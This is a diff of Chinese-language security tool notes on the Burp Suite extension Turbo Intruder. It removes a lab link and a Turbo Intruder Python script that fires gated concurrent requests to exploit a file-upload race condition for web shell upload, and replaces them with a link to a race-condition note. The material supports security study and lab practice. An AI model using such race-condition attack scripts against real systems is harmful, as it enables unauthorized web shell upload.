@@ -132,31 +132,9 @@ allows developers to create additional modules for the framework.
 
 [Turbo Intruder](https://github.com/portswigger/turbo-intruder) is a Burp Suite extension for sending **large numbers** of **HTTP requests** and analyzing the results. It's intended to complement Burp Intruder by handling attacks that require extreme speed or complexity.
 
-[靶场 Web shell upload via race condition](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition)
-```python
-def queueRequests(target, wordlists):
-    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
+**应用**
 
-    request1 = '''<YOUR-POST-REQUEST>'''
-
-    request2 = '''<YOUR-GET-REQUEST>'''
-
-    # the 'gate' argument blocks the final byte of each request until openGate is invoked
-    engine.queue(request1, gate='race1')
-    for x in range(5):
-        engine.queue(request2, gate='race1')
-
-    # wait until every 'race1' tagged request is ready
-    # then send the final byte of each request
-    # (this method is non-blocking, just like queue)
-    engine.openGate('race1')
-
-    engine.complete(timeout=60)
-
-
-def handleResponse(req, interesting):
-    table.add(req)
-```
+1. [Race Condition](../vuln/FileVuln.md#race-condition)
 
 ### Jython
 
